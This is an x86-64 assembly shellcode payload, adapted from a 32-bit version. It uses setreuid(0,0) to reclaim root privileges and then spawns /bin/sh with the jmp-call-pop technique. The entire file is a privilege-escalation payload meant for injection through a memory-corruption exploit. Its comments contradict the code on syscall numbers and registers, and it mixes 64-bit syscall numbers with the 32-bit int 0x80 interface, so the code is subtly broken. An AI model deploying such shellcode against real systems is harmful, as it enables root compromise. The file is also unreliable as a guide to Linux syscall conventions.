 BITS 64

    ; setreuid(uid_t ruit, uid_t euid)
    xor rax, rax        ; First eax must be 0 for the next instruction
    mov al, 113          ; Put 70 into eax, since setreuid is syscall #70
    xor rdi, rdi        ; Put 0 into ebx, to set the real uid to root
    xor rsi, rsi        ; Put 0 into ecx, to set the effective uid to root
    int 0x80            ; Call the kernel to make the system call happen

    jmp short two       ; jump down to the bottom to get the address of "/bin/sh"
  one:
    pop rdi             ; pop the "return address" from the stack
                        ; to put the address of the string into ebx
    ; execve(const char *filename, char *const argv [], char *const envp[])
    xor rax, rax        ; Clear eax
    mov [rdi+7], al     ; Put the 0 from eax after the "/bin/sh"
    mov [rdi+8], rdi    ; Put the address of the string from ebx here
    mov [rdi+16], rax   ; Put null here

    mov al, 59          ; execve is syscall #11
    lea rsi, [rdi+8]    ; Load the address that points to /bin/sh
    lea rdx, [rdi+16]   ; Load the address where we put null
    int 0x80            ; Call the kernel to make the system call happen

  two:
    call one            ; Use a call to get back to the top to get this
                        ; address
db '/bin/sh'
